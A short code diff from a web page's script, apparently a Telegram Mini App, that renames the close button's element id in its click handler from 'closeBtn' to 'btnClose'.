-    $('closeBtn').onclick = () => tg.close();
+    $('btnClose').onclick = () => tg.close();
 
     init();
 </script>
